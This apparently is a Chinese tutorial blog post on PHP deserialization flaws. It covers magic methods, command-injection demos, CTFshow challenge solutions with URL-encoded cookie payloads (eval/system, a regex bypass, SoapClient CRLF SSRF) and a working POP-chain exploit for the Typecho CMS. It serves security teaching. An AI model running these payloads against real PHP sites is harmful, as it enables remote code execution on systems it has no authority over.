![1647408186276-81e36b04-a311-4a89-af2e-5f60e4ac553b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104022328-2083592617.png)

```plain
#知识点：
1、什么是反序列化操作？-格式转换
2、为什么会出现安全漏洞？-魔术方法
3、反序列化漏洞如何发现？ -对象逻辑
4、反序列化漏洞如何利用？-POP链构造
补充：反序列化利用大概分类三类
-魔术方法的调用逻辑-如触发条件
-语言原生类的调用逻辑-如SoapClient
-语言自身的安全缺陷-如CVE-2016-7124

#反序列化课程点：
-PHP&Java&Python

数据的传输的时候，为了更好的传输
序列化：对象转换为数组或字符串等格式
反序列化：将数组或字符串等格式转换成对象
serialize()     //将一个对象转换成一个字符串
unserialize()   //将字符串还原成一个对象

#PHP反序列化漏洞
原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。（如果魔术方法使用不当，那就可能造成漏洞）

#魔术方法利用点分析：
触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：
__construct(): //构造函数，当对象new的时候会自动调用
__destruct()：//析构函数当对象被销毁时会被自动调用
__wakeup(): //unserialize()时会被自动调用
__invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用
__call(): //在对象上下文中调用不可访问的方法时触发
__callStatci(): //在静态上下文中调用不可访问的方法时触发
__get(): //用于从不可访问的属性读取数据
__set(): //用于将数据写入不可访问的属性
__isset(): //在不可访问的属性上调用isset()或empty()触发
__unset(): //在不可访问的属性上使用unset()时触发
__toString(): //把类当作字符串使用时触发
__sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用
```

![1647408237671-5b1ce190-2a2e-465d-bf5c-670e0be7fc64.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104111414-1638433425.png)![1647408224538-66822172-8466-4071-8edb-44b4d0e22243.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104044429-1000900328.png)

- 反序列化-魔术方法&漏洞引发&变量修改等

------

序列化

```plain
序列化：对象转化Wie字符串或数组
class demotest{
	public $name='xiaodi';
	public $sex='man';
	public $age='29';
}
$example=new demotest();
$s=serialize($example);//序列化
echo $s.'<br>';


输出的内容：序列化数据
O:8:"demotest":3:{s:4:"name";s:6:"xiaodi";s:3:"sex";s:3:"man";s:3:"age";s:2:"29";}
O:对象
8:长度
demotest:对象名字
3:3个变量

第一个变量:第一个变量的值
s:4:"name";s:6:"xiaodi";
s:string类型 
4:变量名的长度
name:变量名
s:string类型
6:变量值得长度
xiaodi:变量值

假如修改代码：
class demotest{
	public $name='xiaodi';
	public $sex='man';
	public $age=29;
}
$example=new demotest();
$s=serialize($example);//序列化
echo $s.'<br>';
输出的值：O:8:"demotest":3:{s:4:"name";s:6:"xiaodi";s:3:"sex";s:3:"man";s:3:"age";i:29;}
后面就变成了int类型。
```

反序列化

```plain
反序列化：
class demotest{
	public $name='xiaodi';
	public $sex='man';
	public $age=29;
}
$example=new demotest();
$s=serialize($example);//序列化
$u=unserialize($s);//反序列化
var_dump($u);

序列化数据：O:8:"demotest":3:{s:4:"name";s:6:"xiaodi";s:3:"sex";s:3:"man";s:3:"age";i:29;}
反序列化数据：
输出u的值为：object(demotest)#2 (3) { ["name"]=> string(6) "xiaodi" ["sex"]=> string(3) "man" ["age"]=> int(29) }
```

安全问题A

```plain
安全问题A：
class A{
		public $var='echo test';
    public function test(){
        echo $this->var;
    }
	public function __destruct(){
        echo 'end'.'<br>';
    }
	public function __construct(){
		echo 'start'.'<br>';
	}
	public function __toString(){
		return '__toString'.'<br>';
	}
}
$a=new A();

访问，就输出了start和end 所以调用了__construct()和__destruct()函数。

代码上加上echo serialize($a);，就会输出：start   O:1:"A":1:{s:3:"var";s:9:"echo test";}     end
这个操作就把public中的$var输出出来了。

代码：
class A{
		public $var='echo test';
    public function test(){
        echo $this->var;
    }
	public function __destruct(){
        echo 'end'.'<br>';
    }
	public function __construct(){
		echo 'start'.'<br>';
	}
	public function __toString(){
		return '__toString'.'<br>';
	}
}
$t=unserialize('O:1:"A":1:{s:3:"var";s:9:"echo test";}');


输出了end，证明已经创建过对象了。
如果加上$t->test();输出echo testend，证明调用test方法。

即使不创建对象，那也可以触发对象里面的函数。用到反序列化。

添加代码：
$a=new A();//触发__construct
$a->test();//触发test
echo $a;//触发__toString

这样就输出start  echo test    __toString   end
```

安全问题B

```plain
class B{
    public function __destruct(){
		system('ipconfig');
    }
	public function __construct(){
		echo 'xiaodisec'.'<br>';
	}
}
$b=new b();
输出：xiaodisec和ipconfig命令执行后的结果。

添加代码：echo serialize($b);
输出的序列化字符串为：O:1:"B":0:{}

unserialize($_GET['x']);
传参：?x=O:1:"B":0:{}    也可以执行出ipconfig
```

安全问题C

```plain
class C{
	public $cmd='ipconfig';
    public function __destruct(){
		system($this->cmd);
    }
	public function __construct(){
		echo 'xiaodisec'.'<br>';
	}
}
$cc=new C();会输出xiaodisec和ipconfig

echo serialize($cc);
输出的序列化字符串为：O:1:"C":1:{s:3:"cmd";s:8:"ipconfig";}
如果代码：
unserialize($_GET[c]);
输入
127.0.0.1:8081/web/demo.php?c=O:1:"C":1:{s:3:"cmd";s:6:"whoami";}就能输出whoami的结果。
通过反序列的操作，让ipconfig变成了whoami，把类里的变量变成可控的值。
```

- CTFSHOW-关卡254到260-原生类&POP构造

------

254

```plain
代码：error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}

分析代码逻辑：
要得到flag必须触发
			public function vipOneKeyGetFlag()
					if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        } 
这个时候，触发vipOneKeyGetFlag函数时候，isVip必须为TRUE才能得到flag
思路：触发对象里面的vipOneKeyGetFlag方法，且isVip为真。只要触发login方法并且$this->username===$u&&$this->password===$p，这个时候isVip就会判断为TRUE
传入参数：?username=xxxxxx&password=xxxxxx   得到flag
```

255

```plain
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 

这里login没有做设置，就是即使登录成功了isVip也不会为TRUE，但是在进行vipOneKeyGetFlag执行的时候，就会判断isVip要为TRUE。那应该怎么办呢？我们能不能利用反序列化，把isVip的值变成TRUE。

那应该怎么操作，平台：https://c.runoob.com/compile/1/

构造代码：
<?php
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}
$a=new ctfShowUser();
echo urlencode(serialize($a));

?>
运行得到的代码：O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

进行参数传递：?username=xxxxxx&password=xxxxxx
Cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

256

```plain
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}


这里在获取flag中增加了一个判断$this->username!==$this->password，但是又有判断$this->username===$u&&$this->password===$p;  需要验证登录账号和密码，而且账号和密码不一致。那么可以修改username和password不同，就可以进行测试。

构造代码：
<?php
class ctfShowUser{
    public $username='xx';
    public $password='yy';
    public $isVip=true;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
} 
$a=new ctfShowUser();
echo urlencode(serialize($a));

?>
生成代码：O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A2%3A%22xx%22%3Bs%3A8%3A%22password%22%3Bs%3A2%3A%22yy%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

传入参数：?username=xx&password=yy
Cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A2%3A%22xx%22%3Bs%3A8%3A%22password%22%3Bs%3A2%3A%22yy%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

257

```plain
代码：
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}


这里出现了多个class，看那个地方能够获取flag，有个关键字eval，可以命令执行。通过eval才能获取flag，谁能触发getInfo函数，在ctfShowUser销毁的时候调用了getInfo函数，但是这个调用的类是info上的getInfo，所以需要把info改成backDoor
那么应该怎么构造呢？
<?php
class ctfShowUser{
    private $class;
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    private $code='system("cat f*");';
}
$b=new ctfShowUser();
echo serialize($b);
?>


生成payload:O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D


传入参数：?username=xxxxxx&password=xxxxxx
Cookie:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D
```

258

```plain
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}

比上一道题多了一个过滤!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])   O和C中不能有数字，逻辑基本上跟上一关相同。类中的属性也有所不同。

构造：
<?php
class ctfShowUser{
    public $class="backDoor";
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    public $code="system('cat flag.php');";
}
$b=new ctfShowUser();
$c=serialize($b);
$d=str_replace(':11',':+11',$c);
$e=str_replace(':8',':+8',$d);
echo urlencode($e);
?>
生成：O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D

传入参数：?username=xxxxxx&password=xxxxxx
Cookie:user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
```

259

```plain
flag.php:
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}

题目代码：
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();

flag.php获取flag条件是 ip地址要为127.0.0.1，并且token=ctfshow才能进行写入到flag.txt
在题目代码上接受vip，然后调用getFlag 的值，获取函数名叫getvip，但是这里没有叫vip的东西。魔术方法里有一个调用：__call(): //在对象上下文中调用不可访问的方法时触发
getFlag这个方法是在flag.php和题目代码中都没有提到的。所以就满足这个__call()魔术方法触发。那么__call在哪里呢，__call在原生类中。

参考：https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception
生成序列化时记得开启SoapClient拓展：php.ini中启用php_soap.dll

利用到原生类，让他自己访问自己，然后把flag写到flag.php中

想办法触发对象里面的魔术方法
调用系统原生类，

构造反序列化
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
$a = serialize($b);
$a = str_replace('^^',"\r\n",$a);
echo urlencode($a);
?>
vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22ssrf%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22wupco%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

- CMS代码审计-Typecho反序列化&魔术方法逻辑

------

```plain
参考：https://www.anquanke.com/post/id/155306

全局搜索unserialize，发现在install.php中有使用到这个函数
```

![1647432697436-edbfcf9c-31c8-4b95-a92c-b17c6018b42e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104129268-1143759519.png)

```plain
发现函数Typecho_Db，定位对象，全局搜索class Typecho_Db
```

![1647432850544-358b6524-afd8-4493-971e-970f3c18a874.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104134887-1971464669.png)

```plain
创建对象的时候会调用：__construct方法，然后关键代码：$adapterName = 'Typecho_Db_Adapter_' . $adapterName; 这个就会触发__toString 方法
```

![1647433057503-b33f4ff5-8a8f-4187-bb70-3737fb9af57e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104139034-1926334307.png)

```plain
全局搜索__toString，这个代码$content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;触发了__get方法
继续搜__get方法
```

![1647433191247-578f734f-7bf7-4756-8252-831fd2a615ef.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104142026-569030728.png)

```plain
__get触发了get函数
```

![1647433318178-c92d2bbd-0268-421d-8f27-897dc44fd5d9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104144574-86607031.png)

```plain
get函数在继续调用_applyFilter
```

![1647433501876-7c7250bf-3f50-4f36-85d5-ea27748f980d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104148746-753507075.png)

```plain
跟踪_applyFilter，发现了call_user_func，这个就是产生漏洞的地方
```

![1647433530177-53e345c1-7f3e-49e4-821e-6ba7bb000245.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913104150854-2045116440.png)

```plain
构造payload：
<?php
    class Typecho_Request
    {
        private $_params = array();
        private $_filter = array();

        public function __construct()
        {
            $this->_params['screenName'] = 1; // 执行的参数值
            $this->_filter[0] = 'phpinfo'; //filter执行的函数
        }
    }
    class Typecho_Feed{
        const RSS2 = 'RSS 2.0';
        private $_items = array();
        private $_type;
        function __construct()
        {
            $this->_type = self::RSS2; //进入toString内部判断条件
            $_item['author'] = new Typecho_Request(); //Feed.php文件中触发__get()方法使用的对象
            $this->_items[0] = $_item;
        }
    }
    $exp = new Typecho_Feed();
    $a = array(
        'adapter'=>$exp, // Db.php文件中触发__toString()使用的对象
        'prefix' =>'typecho_'
    );
    echo urlencode(base64_encode(serialize($a)));

?>
```